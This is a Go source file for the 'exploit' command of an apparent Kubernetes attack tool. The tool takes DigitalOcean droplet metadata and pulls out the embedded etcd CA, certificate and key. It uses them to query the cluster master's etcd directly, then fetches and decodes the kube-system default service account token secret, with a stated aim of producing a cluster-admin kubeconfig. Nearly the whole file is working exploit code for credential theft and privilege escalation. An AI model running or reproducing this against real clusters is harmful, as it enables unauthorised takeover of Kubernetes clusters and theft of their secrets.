package exploit

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"

	"github.com/4armed/dopwn/pkg/etcd"
	"github.com/4armed/dopwn/pkg/metadata"
	"github.com/jpbetz/auger/pkg/encoding"
	"github.com/kubicorn/kubicorn/pkg/logger"
	"github.com/spf13/cobra"
)

type config struct {
	metadataFilename string
	etcdCaFile       string
	etcdCertFile     string
	etcdKeyFile      string
	kubeConfig       string
}

// SecretObject will contain our secret details are unmarshal
type SecretObject struct {
	Kind      string `json:"kind,omitempty"`
	Namespace string `json:"namespace,omitempty"`
	Name      string `json:"name"`
}

// ServiceAccount is a rehash of k8s serviceAccount struct but only the bits we want
// (the secret name)
type ServiceAccount struct {
	Secrets []SecretObject `json:"secrets"`
}

// Command represents the exploit command
func Command() *cobra.Command {

	c := config{}
	m := metadata.Metadata{}
	sa := ServiceAccount{}

	cmd := &cobra.Command{
		Use:   "exploit",
		Short: "Take Digital Ocean metadata and return kubeconfig file for cluster-admin user",
		RunE: func(cmd *cobra.Command, args []string) error {

			logger.Info("read metadata from file: %v", c.metadataFilename)
			metaData, err := ioutil.ReadFile(c.metadataFilename)
			if err != nil {
				return err
			}

			logger.Info("parsing metadata to get etcd creds")
			err = metadata.ParseMetadata(metaData, &m)
			if err != nil {
				return err
			}

			logger.Info("writing etcd ca to file: %v", c.etcdCaFile)
			err = ioutil.WriteFile(c.etcdCaFile, []byte(m.EtcdCa), 0644)
			if err != nil {
				return fmt.Errorf("unable to write ca cert to file: %v", err)
			}

			logger.Info("writing etcd cert to file: %v", c.etcdCertFile)
			err = ioutil.WriteFile(c.etcdCertFile, []byte(m.EtcdCert), 0644)
			if err != nil {
				return fmt.Errorf("unable to write cert to file: %v", err)
			}

			logger.Info("writing etcd key to file: %v", c.etcdKeyFile)
			err = ioutil.WriteFile(c.etcdKeyFile, []byte(m.EtcdKey), 0644)
			if err != nil {
				return fmt.Errorf("unable to write key to file: %v", err)
			}

			logger.Info("fetching kube-system default service account token from etcd at %v:2379", m.KubeMasterHostname)
			etcdClient, err := etcd.NewEtcdClient("https://"+m.KubeMasterHostname+":2379", c.etcdCertFile, c.etcdKeyFile, c.etcdCaFile)
			if err != nil {
				return fmt.Errorf("unable to create etcd client: %v", err)
			}
			serviceAccountKey, err := etcdClient.GetValue("/registry/serviceaccounts/kube-system/default")
			if err != nil {
				return fmt.Errorf("unable to fetch service account: %v", err)
			}

			logger.Info("decoding serviceAccount")
			inMediaType, serviceAccountKey, err := encoding.DetectAndExtract(serviceAccountKey)
			if err != nil {
				return fmt.Errorf("could not decode serviceAccount: %v", err)
			}

			var jsonServiceAccountBytes bytes.Buffer
			err = encoding.Convert(inMediaType, "json", serviceAccountKey, &jsonServiceAccountBytes)
			if err != nil {
				return fmt.Errorf("unable to convert serviceAccount: %v", err)
			}
			logger.Debug("serviceAccount JSON is: %v", jsonServiceAccountBytes.String())

			err = json.Unmarshal(jsonServiceAccountBytes.Bytes(), &sa)
			if err != nil {
				return fmt.Errorf("couldn't unmarshal serviceAccount JSON: %v", err)
			}
			serviceAccountTokenSecretName := sa.Secrets[0].Name
			logger.Debug("serviceAccountTokenSecretName: %v", serviceAccountTokenSecretName)

			logger.Info("fetching serviceAccountToken secret")
			serviceAccountTokenSecret, err := etcdClient.GetValue("/registry/secrets/kube-system/" + serviceAccountTokenSecretName)
			if err != nil {
				return fmt.Errorf("unable to retrieve secret: %v", err)
			}
			logger.Debug("serviceAccountTokenSecret: %v", string(serviceAccountTokenSecret))

			logger.Info("decoding secret")
			inMediaType, serviceAccountTokenSecret, err = encoding.DetectAndExtract(serviceAccountTokenSecret)
			if err != nil {
				return fmt.Errorf("could not decode secret: %v", err)
			}

			var jsonServiceAccountTokenSecretBytes bytes.Buffer
			err = encoding.Convert(inMediaType, "json", serviceAccountTokenSecret, &jsonServiceAccountTokenSecretBytes)
			if err != nil {
				return fmt.Errorf("unable to convert serviceAccountTokenSecret: %v", err)
			}
			logger.Debug("serviceAccountTokenSecret JSON is: %v", jsonServiceAccountTokenSecretBytes.String())

			return nil

		},
	}

	cmd.Flags().StringVarP(&c.etcdCaFile, "ca-cert", "a", "etcd-ca.crt", "File to write etcd ca cert to")
	cmd.Flags().StringVarP(&c.etcdCertFile, "etcd-cert", "c", "etcd.crt", "File to write etcd cert to")
	cmd.Flags().StringVarP(&c.etcdKeyFile, "etcd-key", "e", "etcd.key", "File to write etcd key to")
	cmd.Flags().StringVarP(&c.metadataFilename, "metadata-file", "f", "", "Load Digital Ocean metadata from the specified filename")
	cmd.Flags().StringVarP(&c.kubeConfig, "kubeconfig", "k", "kubeconfig", "The filename to write the kubeconfig to")

	cmd.MarkFlagRequired("metadata-file")

	return cmd

}
